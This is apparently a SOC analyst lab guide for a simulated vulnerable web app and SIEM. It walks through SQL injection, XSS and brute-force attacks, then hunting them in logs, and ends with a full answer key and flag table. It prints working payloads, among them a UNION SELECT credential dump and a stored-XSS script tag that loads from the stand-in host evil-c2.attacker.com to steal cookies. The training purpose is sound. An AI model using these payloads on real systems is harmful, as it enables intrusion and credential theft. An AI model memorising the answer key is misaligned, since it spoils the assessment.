# 🛡️ SOC Analyst Lab: Web Attack Forensics & IoC Hunting
## Official Student Guide, Challenge Questions & Answer Key

---

## 📋 Table of Contents
1. [Lab Overview & Architecture](#lab-overview--architecture)
2. [How to Perform the Lab (Step-by-Step Walkthrough)](#how-to-perform-the-lab)
   - [Phase 1: SQL Injection (SQLi) Attack & Detection](#phase-1-sql-injection-sqli-attack--detection)
   - [Phase 2: Cross-Site Scripting (XSS) Attack & Detection](#phase-2-cross-site-scripting-xss-attack--detection)
   - [Phase 3: Authentication Brute Force Attack & Detection](#phase-3-authentication-brute-force-attack--detection)
   - [Phase 4: Multi-Stage Incident Correlation](#phase-4-multi-stage-incident-correlation)
3. [Official Questions & Answer Key](#official-questions--answer-key)
   - [Section 1: Web Log Fundamentals & IoCs](#section-1-web-log-fundamentals--iocs)
   - [Section 2: SQL Injection Forensics](#section-2-sql-injection-forensics)
   - [Section 3: Cross-Site Scripting (XSS) Forensics](#section-3-cross-site-scripting-xss-forensics)
   - [Section 4: Authentication Brute Force Forensics](#section-4-authentication-brute-force-forensics)
   - [Section 5: Capstone Threat Actor Incident Investigation](#section-5-capstone-threat-actor-incident-investigation)
4. [Master Flags Reference](#master-flags-reference)

---

## 1. Lab Overview & Architecture

This lab consists of two synchronized interfaces:
1. **Target Web Application (`CyberVault Systems`)**: An interactive victim environment containing realistic vulnerabilities (vulnerable search catalog, login portal, and feedback guestbook) plus a 1-click **Attack Simulator Console**.
2. **SOC SIEM Console (`CyberWatch`)**: A real-time Security Information and Event Management dashboard displaying HTTP access logs, status code histograms, detection alert feeds, and a deep-dive forensic log inspection drawer.

Every action performed in the Target Application generates authentic HTTP telemetry in the SIEM in real time!

---

## 2. How to Perform the Lab

### Phase 1: SQL Injection (SQLi) Attack & Detection

#### 1. Perform the Attack:
1. Navigate to the **"Target Application"** tab.
2. Ensure you are on the **"🔍 Catalog & Search"** view.
3. Test a boolean tautology in the search bar:
   ```sql
   ' OR '1'='1
   ```
   *Result:* The application returns all standard items plus hidden internal records.
4. Execute a `UNION SELECT` payload to exfiltrate credentials from the database:
   ```sql
   ' UNION SELECT 1,username,password,email,role FROM users--
   ```
   *Result:* The database leaks the `users` table, including the administrator account credentials and Flag #1:
   **`BLITZ{5ql1_un10n_d8_3xf1l_9f82c4a17e}`**

#### 2. Hunt the IoCs in the SIEM:
1. Switch to the **"SOC SIEM Console"** tab.
2. In the search bar, type `uri:*union*` or `status:500` or click the **"SQLi"** quick filter pill.
3. Observe the generated log entry:
   - Method: `GET`
   - URI: `/catalog/search?q=%27+UNION+SELECT...`
   - Matched Rule: `RULE-SEC-001 (SQL Injection - UNION / Data Exfiltration)`
4. Click **"Inspect"** on the log row:
   - Notice the raw URL percent encoding: `%27` represents `'` (single quote).
   - Notice how the SIEM decodes the payload into readable SQL keywords.
   - Filter for `sqlmap` in the SIEM search bar to find the historical reconnaissance IP (`198.51.100.44`) using the automated tool `sqlmap/1.7.2`.

---

### Phase 2: Cross-Site Scripting (XSS) Attack & Detection

#### 1. Perform the Attack:
1. In the **Target Application**, go to **"🔍 Catalog & Search"** (Reflected XSS) or **"💬 Feedback Board"** (Stored XSS).
2. Enter the following payload:
   ```html
   <script>alert('XSS')</script>
   ```
3. Submit the search or feedback comment.
   *Result:* A secure sandbox execution modal pops up showing simulated browser DOM execution, leaking the session cookie and revealing Flag #2:
   **`BLITZ{x55_cl13nt_3x3c_7b39d104fa}`**

#### 2. Hunt the IoCs in the SIEM:
1. Switch to the **"SOC SIEM Console"** tab.
2. Click the **"XSS"** quick filter or type `rule:RULE-SEC-003` in the search bar.
3. Observe the log entry:
   - In Reflected XSS, the payload appears in the GET query string.
   - In Stored XSS, inspect log entry `log-017` on `POST /board/feedback`:
     - URL-encoded payload: `%3Cscript%20src%3D%22http%3A%2F%2Fevil-c2.attacker.com%2Fsteal%22%3E%3C%2Fscript%3E`
     - Decoded parameter: `<script src="http://evil-c2.attacker.com/steal"></script>`
     - Attacker exfiltration C2 endpoint: `http://evil-c2.attacker.com/steal`

---

### Phase 3: Authentication Brute Force Attack & Detection

#### 1. Perform the Attack:
1. In the **Target Application**, navigate to **"🔐 Login Portal"**.
2. Notice the login endpoint accepts username and password.
3. You can either test passwords manually or use the built-in simulator:
   - Click the purple **"Hydra Burst"** button on the login form (or go to **"⚡ Attack Simulator"** and click **"Launch Hydra Attack Burst"**).
4. Watch the simulator fire 24 rapid failed attempts with status `401 Unauthorized`.
5. On the 25th attempt, password `dragon123` succeeds with status `302 Found`, redirecting to the admin dashboard and revealing Flag #3:
   **`BLITZ{bruf3_4uth_c0mpr0m153_6e1a4d88}`**

#### 2. Hunt the IoCs in the SIEM:
1. Switch to the **"SOC SIEM Console"** tab.
2. Check the **"HTTP Response Codes & Activity Volume"** histogram:
   - Notice the massive spike in the red **"401 Unauthorized"** bar.
3. Filter by `status:401` or `category:brute_force`:
   - Identify the burst of consecutive 401s followed immediately by a single `302 Found` from attacker IP `198.51.100.188` or baseline IP `203.0.113.89`.
   - Inspect the request body to confirm password cycling against targeted accounts.

---

### Phase 4: Multi-Stage Incident Correlation

1. In the **SOC SIEM Console**, search for all alerts: click **"🚨 Alerts"** or filter by `ioc:true`.
2. Trace the attack progression by timestamp:
   - **Reconnaissance**: Scanner IP `198.51.100.44` probing SQL syntax with `sqlmap`.
   - **Brute Force**: Threat Actor `203.0.113.89` targeting `sarah_admin` on `/api/login` (34 failed attempts, then successful 302 compromise with password `Summer2026!`).
   - **Exploitation & Backdoor**: Threat Actor `198.51.100.72` injecting Stored XSS into `/board/feedback` to steal administrator cookies.
   - **Exfiltration**: Threat Actor `198.51.100.72` accessing `/admin/export?table=users_credentials` (log `log-018`) to dump the entire database!
3. Reconstructing this sequence yields the master Capstone Flag:
   **`BLITZ{1nc1d3nt_c0rr3l4t10n_89c2e01b}`**

---

## 3. Official Questions & Answer Key

*Copy and paste these questions into your main LMS / assessment platform.*

### Section 1: Web Log Fundamentals & IoCs

**Question 1.1**
* In standard HTTP communication, which 3-digit response status code signifies an authentication failure (Unauthorized access)?
* **Answer:** `401`
* **Explanation:** HTTP 401 indicates that the request has not been applied because it lacks valid authentication credentials for the target resource.

**Question 1.2**
* In the standard NCSA/Apache Combined Log Format, which field comes immediately after the HTTP request line (e.g. `"GET /index.html HTTP/1.1"`)?
* **Answer:** `status code` (also accept `status` or `HTTP status`)
* **Explanation:** The format is: `IP - - [timestamp] "METHOD URI PROTOCOL" STATUS BYTES "REFERER" "USER_AGENT"`.

---

### Section 2: SQL Injection Forensics

**Question 2.1**
* What is the two-character hexadecimal URL percent encoding for a single quotation mark (`'`), commonly seen when attackers break SQL query strings?
* **Answer:** `%27`
* **Explanation:** ASCII character 39 (single quote `'`) in hex is `27`. In URL encoding, this is represented as `%27`.

**Question 2.2**
* Exploit the SQL Injection vulnerability in the Target Application catalog search using a `UNION SELECT` query. What is the administrative secret flag retrieved from the leaked user database?
* **Answer:** `BLITZ{5ql1_un10n_d8_3xf1l_9f82c4a17e}`
* **Explanation:** Injecting `' UNION SELECT 1,username,password,email,role FROM users--` causes the application to dump the hidden users table containing this flag in the admin record.

**Question 2.3**
* Search the SOC SIEM logs for automated SQL injection scanner activity. What was the source IP address that launched the automated `sqlmap` vulnerability scan against `/catalog/search`?
* **Answer:** `198.51.100.44`
* **Explanation:** Filtering the SIEM for `sqlmap` reveals requests originating from `198.51.100.44` with the User-Agent header `sqlmap/1.7.2#stable`.

---

### Section 3: Cross-Site Scripting (XSS) Forensics

**Question 3.1**
* What URL percent-encoded string represents the opening angle bracket (`<`) frequently observed in raw access logs during HTML/script tag injection attacks?
* **Answer:** `%3C` (also accept `%3c`)
* **Explanation:** ASCII 60 in hex is `3C`, which URL encodes to `%3C`.

**Question 3.2**
* Trigger the Reflected XSS vulnerability in the Target Application search bar with a script alert payload. What flag is displayed in the client-side execution sandbox?
* **Answer:** `BLITZ{x55_cl13nt_3x3c_7b39d104fa}`
* **Explanation:** Submitting `<script>alert('XSS')</script>` triggers the client-side sandbox execution modal which displays this challenge flag.

**Question 3.3**
* In the SOC SIEM logs, inspect the stored XSS attack targeting the guestbook endpoint (`/board/feedback`). What malicious external C2 domain endpoint was the attacker attempting to load scripts from?
* **Answer:** `http://evil-c2.attacker.com/steal` (also accept `evil-c2.attacker.com`)
* **Explanation:** Inspecting log `log-017` in the SIEM reveals the decoded POST parameter: `<script src="http://evil-c2.attacker.com/steal"></script>`.

---

### Section 4: Authentication Brute Force Forensics

**Question 4.1**
* What HTTP status code anomaly in the SIEM timeline histogram serves as the primary behavioral indicator of an active login brute-force attack?
* **Answer:** `401` (also accept `401 Unauthorized`)
* **Explanation:** High-volume surges of 401 status codes in short intervals against login endpoints are the hallmark signature of password guessing attacks.

**Question 4.2**
* Execute the brute force attack against user `admin` on the Target Application login page. What is the cracked legitimate password that yields an HTTP 302 redirect?
* **Answer:** `dragon123`
* **Explanation:** The 25th dictionary candidate `dragon123` authenticates successfully, returning HTTP status 302 and granting access.

**Question 4.3**
* What flag is unlocked upon successfully authenticating as `admin` on the Target Application login portal?
* **Answer:** `BLITZ{bruf3_4uth_c0mpr0m153_6e1a4d88}`
* **Explanation:** Successfully logging in with password `dragon123` or injecting the SQLi auth bypass `' OR '1'='1` unlocks this compromise flag.

**Question 4.4**
* In the SOC SIEM baseline logs, an attacker conducted an automated brute force attack against the account `sarah_admin`. What was the attacker's source IP address?
* **Answer:** `203.0.113.89`
* **Explanation:** Searching for `sarah_admin` in the SIEM logs reveals 34 rapid 401 failures followed by a 302 redirect from IP `203.0.113.89`.

---

### Section 5: Capstone Threat Actor Incident Investigation

**Question 5.1**
* Identify the external threat actor IP address responsible for the multi-stage attack involving XSS injection and administrative data export?
* **Answer:** `198.51.100.72`
* **Explanation:** Logs `log-015`, `log-016`, `log-017`, and `log-018` all originate from `198.51.100.72`.

**Question 5.2**
* What sensitive database table name did this adversary target in their unauthorized `GET /admin/export` request?
* **Answer:** `users_credentials`
* **Explanation:** In log `log-018`, the query parameter is `table=users_credentials`.

**Question 5.3**
* Enter the master Incident Correlation Flag awarded for completing the end-to-end incident investigation:
* **Answer:** `BLITZ{1nc1d3nt_c0rr3l4t10n_89c2e01b}`
* **Explanation:** Master triage flag representing full correlation of the threat actor's kill chain.

---

## 4. Master Flags Reference

| Vulnerability / Attack Vector | Location / Trigger | Flag Value |
|---|---|---|
| **SQL Injection (UNION Leak)** | Target App -> Catalog Search (`' UNION SELECT...`) | `BLITZ{5ql1_un10n_d8_3xf1l_9f82c4a17e}` |
| **Cross-Site Scripting (XSS)** | Target App -> Search / Feedback (`<script>...`) | `BLITZ{x55_cl13nt_3x3c_7b39d104fa}` |
| **Authentication Compromise** | Target App -> Login (`admin` : `dragon123`) | `BLITZ{bruf3_4uth_c0mpr0m153_6e1a4d88}` |
| **Capstone Incident Correlation** | SIEM Log Correlation (Attacker `198.51.100.72`) | `BLITZ{1nc1d3nt_c0rr3l4t10n_89c2e01b}` |
